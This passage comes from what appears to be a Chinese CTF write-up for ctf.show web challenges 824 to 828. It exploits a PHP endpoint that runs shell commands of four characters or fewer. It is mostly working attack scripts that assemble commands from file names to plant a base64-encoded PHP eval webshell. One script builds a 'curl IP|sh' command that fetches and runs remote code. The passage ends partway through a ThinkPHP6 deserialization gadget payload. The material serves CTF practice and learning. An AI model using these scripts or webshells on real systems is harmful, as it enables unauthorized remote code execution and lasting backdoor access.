-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:55:28</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload=[</span><br><span class="line"><span class="string">&quot;&gt;grep&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;h&quot;</span>,</span><br><span class="line"><span class="string">&quot;*&gt;j&quot;</span>,</span><br><span class="line"><span class="string">&quot;rm g*&quot;</span>,</span><br><span class="line"><span class="string">&quot;rm h*&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;cat&quot;</span>,</span><br><span class="line"><span class="string">&quot;*&gt;&gt;i&quot;</span>,</span><br><span class="line"><span class="string">&quot;rm c*&quot;</span>,</span><br><span class="line"><span class="string">&quot;rm j&quot;</span>,</span><br><span class="line"><span class="string">&quot;&gt;cp&quot;</span>,</span><br><span class="line"><span class="string">&quot;*&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def writeFile(payload):</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line"><span class="keyword">for</span> p in payload:</span><br><span class="line">writeFile(p.strip())</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>即可命令执行<br>（由于没有回显，可以在当前页面写一句话木马）</p><h1 id="web825（4字符，可写，有dir）"><a href="#web825（4字符，可写，有dir）" class="headerlink" title="web825（4字符，可写，有dir）"></a>web825（4字符，可写，有dir）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag in database;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$cmd</span>) &lt;= <span class="number">4</span>)&#123;</span><br><span class="line">    shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>本题主要就是构造ls -t<br>可以利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&gt;sl&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;kt-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;j\\&gt;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;j\\#&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v&gt;x&#x27;</span>,</span><br></pre></td></tr></table></figure><p>进行构造ls -t &gt; x中<br>之后执行x就行<br>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:55:42</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"><span class="string">&#x27;&gt;sl&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;kt-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;j\\&gt;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;j\\#&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;dir&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v&gt;x&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;a.\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\&gt;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;-d\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;64\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;se\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ba\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\|\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;4=\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Pz\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;k7\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;XS\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;sx\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;VF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;dF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;X0\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;gk\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;bC\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Zh\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ZX\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Ag\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;aH\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;9w\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;PD\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;S&#125;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;IF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;&#123;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\$\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ho\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ec\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh x&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh j&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeFile</span>(<span class="params">payload</span>):</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> payload:</span><br><span class="line">writeFile(p.strip())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>():</span></span><br><span class="line">response = requests.get(url+<span class="string">&quot;a.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="string">&quot;a.php&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">run()</span><br><span class="line">check()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（这个码是get传参，需要套娃）</p><h1 id="web826（4字符，可写，无dir）"><a href="#web826（4字符，可写，无dir）" class="headerlink" title="web826（4字符，可写，无dir）"></a>web826（4字符，可写，无dir）</h1><p>没有dir,师傅给出了新的方法<br>这里需要flask搭建一个输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;<span class="number">1</span>.php</span><br></pre></td></tr></table></figure><p>的网页</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:55:58</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://68786806-1097-4051-acc5-9b89a2d7e85e.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="comment">#url=&quot;http://101.34.94.44/aaa/index.php&quot; yu师傅搭建的环境</span></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"><span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;-t\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\&gt;a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ls\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ls&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;mv&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;vt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ls&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;l*&gt;t&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;cat&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*t&gt;z&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="comment">#这个地方的ip是用的10进制，因为用普通的ip地址存在多个点号。</span></span><br><span class="line"><span class="comment">#可以用这个网站转https://tool.520101.com/wangluo/jinzhizhuanhuan/</span></span><br><span class="line"><span class="string">&#x27;&gt;sh&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\|\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;38\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;44\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\:\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;57\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;33\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;95\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;94\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;20\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;rl\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;cu\\&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;sh z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh a&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">def writeFile(payload):</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line"><span class="keyword">for</span> p in payload:</span><br><span class="line">writeFile(p.strip())</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line">response = requests.get(url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="string">&quot;1.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">run()</span><br><span class="line">check()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web827（4字符，可写、无dir，不出网）"><a href="#web827（4字符，可写、无dir，不出网）" class="headerlink" title="web827（4字符，可写、无dir，不出网）"></a>web827（4字符，可写、无dir，不出网）</h1><p>服务器不出网则无法使用curl命令，老套路</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-05-06 13:25:41</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-05-10 20:56:17</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line"><span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;-t\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\&gt;a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ls\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ls&gt;v&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;mv&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;vt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*v*&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ls&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;l*&gt;t&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;cat&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;*t&gt;z&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&gt;php&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;a.\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\&gt;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;-d\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\ \\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;64\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;se\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ba\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\|\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;4=\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Pz\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;k7\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;XS\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;sx\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;VF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;dF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;X0\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;gk\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;bC\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Zh\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ZX\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;Ag\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;aH\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;9w\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;PD\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;S&#125;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;IF\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;&#123;\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;\\$\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ho\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;&gt;ec\\&#x27;</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;sh z&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sh a&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def writeFile(payload):</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;cmd&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line"><span class="keyword">for</span> p in payload:</span><br><span class="line">writeFile(p.strip())</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] create &quot;</span>+p.strip())</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def check():</span><br><span class="line">response = requests.get(url+<span class="string">&quot;a.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> response.status_code == requests.codes.ok:</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="string">&quot;a.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">run()</span><br><span class="line">check()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总结<br><img src="https://img-blog.csdnimg.cn/f1f0baca74c849de9b00d6d1442a6a53.png"></p><h1 id="web828（国赛TP6的反序列化）"><a href="#web828（国赛TP6的反序列化）" class="headerlink" title="web828（国赛TP6的反序列化）"></a>web828（国赛TP6的反序列化）</h1><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-05-27 15:32:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-05-31 20:16:32</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Local</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Cached</span>\<span class="title">Storage</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>\<span class="title">local</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adapter</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$cache</span> = [];</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span 